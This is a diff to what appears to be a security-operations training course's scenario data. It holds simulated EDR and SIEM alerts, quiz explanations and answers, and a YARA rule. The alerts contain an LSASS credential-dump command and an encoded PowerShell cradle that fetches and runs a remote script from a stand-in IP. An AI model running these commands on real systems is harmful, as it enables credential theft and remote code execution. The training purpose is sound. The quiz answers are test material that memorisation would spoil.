@@ -381,22 +381,25 @@ After compromising one machine, attackers move to others. A common tool is **PsE
           user: "CORP\\svc-backup",
         },
         raw: {
-          "crowdstrike.event_simpleName": "ProcessRollup2",
+          "crowdstrike.event_simpleName": "DetectionSummaryEvent",
           "crowdstrike.SeverityName": "Critical",
+          "crowdstrike.Tactic": "Credential Access",
           "crowdstrike.Technique": "LSASS Memory",
           "threat.technique.id": "T1003",
           "threat.technique.subtechnique.id": "T1003.001",
-          "crowdstrike.ContextBaseFileName": "cmd.exe",
-          "crowdstrike.ContextProcessId": "2048",
+          "crowdstrike.FileName": "rundll32.exe",
+          "crowdstrike.ContextProcessId": "4812",
+          "crowdstrike.ParentBaseFileName": "cmd.exe",
+          "crowdstrike.ParentProcessId": "2048",
           "crowdstrike.CommandLine":
             "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Windows\\Temp\\lsass.dmp full",
           "crowdstrike.TargetProcessImageFileName": "lsass.exe",
           "crowdstrike.DesiredAccess": "2097151",
           "crowdstrike.UserName": "CORP\\svc-backup",
           "crowdstrike.ComputerName": "SRV-DC01",
-          "crowdstrike.DetectId": "ldt:abc123:def456",
+          "crowdstrike.DetectId": "ldt:3f8e2a91c4d74b6a9e1f0c5d2b7a8e14:38654705669",
           "crowdstrike.FalconHostLink":
-            "https://falcon.crowdstrike.com/activity/detections/detail/abc123",
+            "https://falcon.crowdstrike.com/activity/detections/detail/3f8e2a91c4d74b6a9e1f0c5d2b7a8e14/38654705669",
         },
       },
       questions: [
@@ -501,25 +504,27 @@ After compromising one machine, attackers move to others. A common tool is **PsE
           parent_name: "winword.exe",
           parent_pid: 5560,
           cmdline:
-            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
+            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYAMgAvAHEAMwAuAHAAcwAxACcAKQA=",
           user: "CORP\\l.chen",
         },
         raw: {
-          "crowdstrike.event_simpleName": "ProcessRollup2",
+          "crowdstrike.event_simpleName": "DetectionSummaryEvent",
           "crowdstrike.SeverityName": "Critical",
+          "crowdstrike.Tactic": "Stealth",
           "crowdstrike.Technique": "Process Injection",
           "threat.technique.id": "T1055",
-          "crowdstrike.ContextBaseFileName": "winword.exe",
-          "crowdstrike.ContextProcessId": "5560",
+          "crowdstrike.FileName": "powershell.exe",
+          "crowdstrike.ContextProcessId": "6120",
           "crowdstrike.CommandLine":
-            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
+            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYAMgAvAHEAMwAuAHAAcwAxACcAKQA=",
           "crowdstrike.TargetProcessImageFileName": "explorer.exe",
           "crowdstrike.DesiredAccess": "2097151",
           "crowdstrike.UserName": "CORP\\l.chen",
           "crowdstrike.ComputerName": "WKST-FINANCE07",
           "crowdstrike.ParentBaseFileName": "WINWORD.EXE",
-          "crowdstrike.FileName": "Q3_Invoice_Reconciliation.docm",
-          "crowdstrike.DetectId": "ldt:qrt789:xyz012",
+          "crowdstrike.ParentProcessId": "5560",
+          "crowdstrike.ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\l.chen\\Downloads\\Q3_Invoice_Reconciliation.docm\" /o \"\"",
+          "crowdstrike.DetectId": "ldt:9c41e7b2a05d4f8e8b3a6d17e2f0c954:42949675113",
         },
       } satisfies TelemetryEvent,
       correct_verdict: "true_positive",
@@ -776,7 +781,11 @@ SentinelOne detects Cobalt Strike through:
       id: "s1-la1",
       heading: "SentinelOne Alert: Ransomware Encryption Cascade",
       context:
-        "It is 09:14 AM on a Monday morning. A Critical severity detection fires in your SentinelOne console. The threat name is 'Trojan.Ransom.LockBit3' and the affected machine belongs to a finance department employee. Files are actively being encrypted right now. Every minute of delay means more files locked. Analyse the detection and answer the questions.",
+        "It is 09:14 AM on a Monday morning. A Critical severity detection fires in your SentinelOne console. The threat name is 'Trojan.Ransom.LockBit3' and the affected machine belongs to a finance department employee. Files are actively being encrypted right now. Every minute of delay means more files locked.
+
+**What Deep Visibility tells you:** a query on this detection's storyline counts 15,847 File Rename events by chrome_update.exe in the last 9 minutes, each new name ending in .lockbit. The threat record itself does not carry that count.
+
+Analyse the detection and answer the questions.",
       event: {
         id: "s1-evt-ransomware-001",
         ts: "2025-06-16T09:14:22.000Z",
@@ -821,8 +830,6 @@ SentinelOne detects Cobalt Strike through:
             "C:\\Users\\j.smith\\AppData\\Local\\Temp\\chrome_update.exe",
           "s1.sha256":
             "a9d6850fd4a3c9d16b93129250a8d61de131cd7a9551e768ca1426d4766f859b",
-          "s1.fileCount_renamed": "15847",
-          "s1.extensionAdded": ".lockbit",
           "s1.storylineId": "0x1A2B3C4D",
           "s1.agentComputerName": "LAPTOP-JSMITH",
           "s1.userName": "j.smith",
@@ -842,7 +849,7 @@ SentinelOne detects Cobalt Strike through:
           ],
           answer: 1,
           explanation:
-            "This is masquerading (MITRE T1036): naming the binary 'chrome_update.exe' so users and analysts dismiss it as a routine update. Chrome really does update through a separate program, but that is Google's signed updater (GoogleUpdate.exe / updater.exe) under Program Files or AppData\\Local\\Google\\Update, not a 'chrome_update.exe' in AppData\\Local\\Temp; so 'the name fits a browser update' takes the premise too far. 'Temp alone is proof' overstates it. Installers, Google's included, briefly unpack files in %TEMP%, so the name, the path outside Google's updater and the missing Google signature together are what settle it. 'User rights, so it cannot touch much' is wrong for ransomware: the user's own documents and mapped shares are exactly what it encrypts, as the rename count in this detection shows.",
+            "This is masquerading (MITRE T1036): naming the binary 'chrome_update.exe' so users and analysts dismiss it as a routine update. Chrome really does update through a separate program, but that is Google's signed updater (GoogleUpdate.exe / updater.exe) under Program Files or AppData\\Local\\Google\\Update, not a 'chrome_update.exe' in AppData\\Local\\Temp; so 'the name fits a browser update' takes the premise too far. 'Temp alone is proof' overstates it. Installers, Google's included, briefly unpack files in %TEMP%, so the name, the path outside Google's updater and the missing Google signature together are what settle it. 'User rights, so it cannot touch much' is wrong for ransomware: the user's own documents and mapped shares are exactly what it encrypts, as the 15,847 renames Deep Visibility counted show.",
           xp: 50,
         },
         {
@@ -881,9 +888,9 @@ SentinelOne detects Cobalt Strike through:
       type: "flag",
       id: "s1-flag1",
       prompt:
-        "For the impact section of the incident report you need the scale of the damage on LAPTOP-JSMITH. From the SentinelOne detection above, enter the number of files it hit (digits only, no commas).",
+        "For the impact section of the incident report you need the scale of the damage on LAPTOP-JSMITH. From the Deep Visibility count on this detection's storyline, enter the number of files it hit (digits only, no commas).",
       answer: "15847",
-      hint: "Reading 3 says what ransomware does to the name of each file it locks. Find the agent's count of that action.",
+      hint: "Reading 3 says what ransomware does to the name of each file it locks. The storyline query in the log-analysis context counted that action.",
       xp: 40,
     },
 
@@ -1176,7 +1183,7 @@ rule Suspicious_Credential_Stealer_Strings
     strings:
         $s1 = "Login Data" wide ascii
         $s2 = "\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data" wide ascii  // a literal backslash must be written as \\\\ in YARA text strings
-        $s3 = { 4D 5A }  // MZ header — PE file
+        $s3 = { 4D 5A }  // MZ header: PE file
         $re1 = /https?:\\/\\/[a-z0-9]{16,}\\.(top|xyz|info)/ nocase
 
     condition:
@@ -1684,7 +1691,11 @@ Before adding an IOC to your blocklist, ask:
       id: "ioc-la1",
       heading: "SIEM Alert: Threat Intelligence Match on Outbound Connection",
       context:
-        "Your SIEM has fired a 'Threat Intelligence Match' alert. An internal laptop (LAPTOP-JSMITH) made an outbound connection to an external IP address that matched your threat intelligence feed. The SIEM automatically enriched the alert with details from AbuseIPDB. This might be an employee browsing through a VPN, connecting to malware C2, or something else entirely. Your job is to investigate.",
+        "Your SIEM has fired a 'Threat Intelligence Match' alert. An internal laptop (LAPTOP-JSMITH) made an outbound connection to an external IP address that matched your threat intelligence feed. The match came from the SIEM's threat-intel list (a Wazuh CDB list built from your Tor-relay feed), not from the firewall.
+
+**What the enrichment panel adds (AbuseIPDB lookup):** 198.51.100.45 is categorised as a Tor relay, abuse confidence 95, 3,847 reports, last reported 2025-06-23, tags proxy, anonymizer, scanning. None of this is in the log line; it is looked up after the match.
+
+This might be an employee browsing through a VPN, connecting to malware C2, or something else entirely. Your job is to investigate.",
       event: {
         id: "ti-evt-tor-001",
         ts: "2025-06-23T16:42:18.000Z",
@@ -1701,20 +1712,31 @@ Before adding an IOC to your blocklist, ask:
         mitre_technique: "T1090.003",
         mitre_tactic: "Command and Control",
         description:
-          "Outbound connection from LAPTOP-JSMITH to IP 198.51.100.45 matched threat intelligence feed. IP classified as Tor relay with 3,847 abuse reports. Connection on port 443.",
+          "Outbound connection from LAPTOP-JSMITH (10.0.1.55) to 198.51.100.45:443 matched the SIEM threat-intel list",
+        // Wazuh alert on a FortiGate traffic log: the decoder puts the FortiGate keys under data.*;
+        // the custom rule fired because data.dstip is on a CDB list. TI details are in the context.
         raw: {
+          timestamp: "2025-06-23T16:42:18.000+0000",
+          "rule.id": "100120",
+          "rule.level": "10",
+          "rule.description": "Outbound connection to an address on the threat-intel list (tor-relays)",
+          "rule.groups": ["fortigate", "threat_intel"],
+          "rule.firedtimes": 1,
+          "agent.name": "wazuh-manager",
+          "agent.id": "000",
+          "decoder.name": "fortigate-firewall-v6",
+          location: "10.0.0.1",
+          "data.devname": "FGT-CORP-EDGE",
+          "data.type": "traffic",
+          "data.subtype": "forward",
+          "data.action": "accept",
           "data.srcip": "10.0.1.55",
           "data.dstip": "198.51.100.45",
           "data.dstport": "443",
-          "data.proto": "tcp",
-          "threat_intel.indicator": "198.51.100.45",
-          "threat_intel.category": "Tor Relay",
-          "threat_intel.confidence": "95",
-          "threat_intel.source": "AbuseIPDB",
-          "threat_intel.report_count": "3847",
-          "threat_intel.last_reported": "2025-06-23",
-          "threat_intel.tags": ["proxy", "anonymizer", "scanning"],
-          "data.hostname": "LAPTOP-JSMITH",
+          "data.service": "HTTPS",
+          "data.policyid": "1",
+          "data.sessionid": "60348812",
+          "full_log": "date=2025-06-23 time=16:42:18 devname=\"FGT-CORP-EDGE\" devid=\"FG100FTK21009833\" logid=\"0000000020\" type=\"traffic\" subtype=\"forward\" level=\"notice\" vd=\"root\" srcip=10.0.1.55 srcport=52817 srcintf=\"port2\" dstip=198.51.100.45 dstport=443 dstintf=\"port1\" sessionid=60348812 proto=6 action=\"accept\" policyid=1 service=\"HTTPS\" trandisp=\"snat\" duration=10 sentbyte=1520 rcvdbyte=4387",
         },
       },
       questions: [
